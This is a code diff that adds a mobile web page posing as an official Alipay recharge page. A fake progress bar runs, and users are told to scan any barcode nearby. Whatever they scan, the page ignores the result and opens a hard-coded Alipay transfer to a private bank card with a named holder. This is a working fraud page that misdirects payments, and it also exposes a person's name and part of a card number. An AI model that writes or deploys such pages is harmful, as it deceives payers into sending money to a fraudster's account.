@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html style="font-size: 100px; visibility: visible;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="aliBillReset.css">
+    <link rel="stylesheet" href="aliBillPayCode.css">
+    <script src="https://cdn.staticfile.org/jquery/3.3.1/jquery.min.js"></script>
+    <title>支付宝官方在线充值</title>
+    <meta name="__hash__" content="0b742ffc556e4ad2190002bca5a1369f_9e5bf7e290c0f643e6bc0f0e6e44f31d" /></head>
+<!-- 适配代码 -->
+<body style="visibility: visible;">
+<script>
+    (function (doc, win) {
+        var docEl = doc.documentElement,
+            resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize',
+            recalc = function () {
+                var clientWidth = docEl.clientWidth;
+                if (!clientWidth)
+                    return;
+                docEl.style.fontSize = parseInt(100 * ((clientWidth > 750 ? 750 : clientWidth) / 750)) + 'px';
+            };
+        if (!doc.addEventListener)
+            return;
+        win.addEventListener(resizeEvt, recalc, false);
+        doc.addEventListener('DOMContentLoaded', recalc, false);
+    })(document, window);
+</script>
+<div class="paytotalbox">
+    <div class="payicon"></div>
+    <div class="payalert">付款成功后将自动充值到账</div>
+    <div class="centerline"></div>
+    <div class="ordernumber">订单号：<{$orderid}></div>
+    <div class="paynumbox">
+        <div class="paynumtitle">充值金额：</div>
+        <div class="paynumber"><span class="moneyicon">¥</span><span id="moneynum"> <{$amount}></span></div>
+    </div>
+    <div class="copybutton" style="background-color: rgb(204, 204, 204); color: rgb(119, 119, 119);">
+        <span></span>
+        <div id="fill" style="width: 0%;"></div>
+        <div id="showNumber"></div>
+    </div>
+    <div class="paytimehint">订单正在创建,请等待<span>5s</span></div>
+</div>
+<!-- 分割线 -->
+<div class="line"></div>
+<!-- 说明部分 -->
+<div class="explainbox">
+    <div class="explainitem">
+        <div class="explainicon explainiconone"></div>
+        <div class="explaintext">①扫描周边任意条形码(包装盒、书本、瓶罐等物品上的条形码)</div>
+        <div class="explainLine"></div>
+    </div>
+    <div class="explainitem">
+        <div class="explainicon explainicontwo"></div>
+        <div class="explaintext">②跳转至手机支付宝支付</div>
+        <div class="explainLine"></div>
+    </div>
+    <div class="explainitem explainitemtwo">
+        <div class="explainicon explainicontwo"></div>
+        <div class="explaintext">③支付完成</div>
+    </div>
+    <!-- 温馨提示 -->
+    <div class="hintTitlebox">
+        <div class="hintTitletext">温馨提示</div>
+        <div class="hintLine"></div>
+    </div>
+    <div class="hintdesc">①必须<span>直接扫码</span>安卓手机可能需要扫条码1到2次 </div>
+    <div class="hintdesc">④相册导入无效，请求只需支付一次即可</div>
+    <input type="hidden" value="" class="url">
+</div>
+<script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+<script>
+    var ordno = "";
+    var u = navigator.userAgent;
+    var isAndroid = u.indexOf('ndroid') > -1 || u.indexOf('Adr') > -1; //android终端
+
+
+    ap.setNavigationBar({
+        title: '自助充值',
+        backgroundColor: '#D03B41'
+    });
+    //副标题文字
+    AlipayJSBridge.call('setTitle', {
+        title: '自助充值'
+    });
+    AlipayJSBridge.call('setOptionMenu', {
+        icontype: 'filter',
+    });
+    AlipayJSBridge.call('showOptionMenu');
+    document.addEventListener('optionMenu', function (e) {
+        AlipayJSBridge.call('showPopMenu', {
+            menus: [],
+        }, function (e) {
+            console.log(e);
+        });
+    }, false);
+    //    解决渲染页面缩放
+    setTimeout(function () {
+        document.querySelector("body").style.visibility = "visible"
+        document.querySelector("html").style.visibility = "visible"
+    }, 0);
+    $(".backbox").click(function () {
+        window.history.back();
+    })
+
+    // $(".copybutton").click(function () {
+    //     ss();
+    // })
+    function sleep(delay) {
+        var start = (new Date()).getTime();
+        while ((new Date()).getTime() - start < delay) {
+            continue;
+        }
+    }
+    //成功获取到url后更改按钮样式
+    function timeInterval() {
+        $('.copybutton').text("立即支付");
+        $('.copybutton').css({
+            'background-color': '#EDCD90',
+            'color': '#333333'
+        });
+    }
+
+    // 加载js进度条
+
+    var fill = document.getElementById('fill');
+    var showNumber = document.getElementById('showNumber');
+    var count = 0;
+    var readyCheckCount = 0;
+    var gourl="alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo=622208***4909&bankAccount=苏桂青&money=0.01&amount=0.01&bankMark=ICBC&bankName=中国工商银行&cardIndex=1901091791163453041&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from";
+    var t= 0;
+    //suctime();
+    initone();
+
+    function initone() {
+        $('.copybutton').css({
+            'backgroundColor': '#CCCCCC',
+            'color': '#777777'
+        })
+        $('.copybutton>span').text('');
+        var timerone = setInterval(function () {
+            count++;
+            showNumber.innerHTML = count + '%';
+            fill.style.width = count + '%';
+            if (count === 30) {
+                clearInterval(timerone);
+                inittwo();
+            }
+        }, 5)
+    }
+    function inittwo() {
+        var timertwo = setInterval(function (e) {
+            count++;
+            showNumber.innerHTML = count + '%';
+            fill.style.width = count + '%';
+            if (count === 100) {
+                clearInterval(timertwo);
+                suctime();
+            }
+
+        }, 10);
+    }
+
+    function ready(callback) {
+      // 如果jsbridge已经注入则直接调用
+      if (window.AlipayJSBridge) {
+        callback && callback();
+      } else {
+        // 如果没有注入则监听注入的事件
+        document.addEventListener('AlipayJSBridgeReady', callback, false);
+      }
+    }
+    
+
+    function suctime(){
+        showNumber.innerHTML = "立即支付"
+        $('.copybutton').css({
+            'background-color': '#EDCD90',
+            'color': '#333333'
+        });
+
+        // AlipayJSBridge.call('scan', {
+        //   type: 'bar'
+        // }, function(result) {
+        //   // alert(JSON.stringify(result));
+        //   window.location.href = gourl;
+        // });
+
+        ready(function() {
+          document.querySelector('.copybutton').addEventListener('click', function() {
+            AlipayJSBridge.call('scan', {
+              type: 'bar'
+            }, function(result) {
+              // alert(JSON.stringify(result));
+              window.location.href = gourl;
+            });
+          });
+        });
+
+    }
+
+</script>
+
+</html>
